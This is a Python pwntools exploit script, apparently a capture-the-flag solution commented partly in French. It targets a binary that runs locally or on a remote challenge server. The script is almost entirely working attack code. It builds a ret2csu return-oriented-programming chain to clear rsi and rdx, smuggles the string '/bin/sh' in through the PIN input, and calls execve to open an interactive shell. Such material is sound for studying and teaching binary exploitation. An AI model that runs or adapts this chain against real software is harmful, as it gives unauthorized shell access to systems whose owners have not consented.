#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=2)
context.terminal = ["tmux", "splitw", "-h"]

exe = ELF("./bin")

if args.GDB:
    p = gdb.debug(
        "./bin",
        """
    source /home/user/.gdbinit-gef.py
    break *(main+265)
    continue
    """,
    )
elif args.LOCAL:
    p = process("./bin")
else:
    p = remote("cytech.tcdn.casa", 4605)

# gadget ret2csu, pour controler rdx
# 4c 89 f2                mov    rdx,r14
# 4c 89 ee                mov    rsi,r13
# 44 89 e7                mov    edi,r12d
# 41 ff 14 df             call   QWORD PTR [r15+rbx*8]
# 48 83 c3 01             add    rbx,0x1
# 48 39 dd                cmp    rbp,rbx
# 75 ea                   jne    0x401260 <__libc_csu_init+64>
# 48 83 c4 08             add    rsp,0x8
# 5b                      pop    rbx
# 5d                      pop    rbp
# 41 5c                   pop    r12
# 41 5d                   pop    r13
# 41 5e                   pop    r14
# 41 5f                   pop    r15
# c3                      ret
g_ret2csu = 0x0000000000401310
g_pop_rbx_rbp_r12_r13_r14_r15 = 0x0040132A
ptr_to_func_fini = (
    0x0000000000403DE0  # le pointeur de pointeur de fonction _fini qui ne fait rien
)
g_poprdi = 0x00401333

UNUSED = -1  # pour combler les trous
str_pin = 0x404050  # addr of 'pin', which we will make equal to '/bin/sh\0'

payload = flat(
    {
        # ROP CHAIN:
        40: [
            # MOV RSI, NULL (execve's argv)
            # MOV RDX, NULL (execve's envp)
            # (a mettre avant de set rdi et rsi, car g_mov_rdx_r14 altere ces registres)
            [
                g_pop_rbx_rbp_r12_r13_r14_r15,
                [
                    0,  # RBX=0 condition to not trigger 'jne 0x401260'
                    1,  # RBP=1 condition to not trigger 'jne 0x401260'
                    UNUSED,  # R12
                    0,  # R13=0, du coup apres le 'mov rsi, r13', on aura RSI=0
                    0,  # R14=0, du coup apres le 'mov rdx, r14', on aura RDX=0
                    ptr_to_func_fini,  # R15=ptr_to_func_fini (does nothing)
                ],
                g_ret2csu,
                [
                    UNUSED,  # add rsp,0x8
                    UNUSED,  # pop rbx
                    UNUSED,  # pop rbp
                    UNUSED,  # pop r12
                    UNUSED,  # pop r13
                    UNUSED,  # pop r14
                    UNUSED,  # pop r15
                ],
            ],
            # MOV RDI, "/bin/sh" (execve's pathname)
            # call execve@plt("/bin/sh")
            g_poprdi,
            str_pin,
            exe.plt.execve,
        ],
    }
)
log.hexdump(payload)
log.info(f"payload len = {len(payload)}")

p.sendlineafter(b"Name: ", payload)
p.sendlineafter(b"PIN: ", str(u64(b"/bin/sh\0")).encode())
p.interactive()
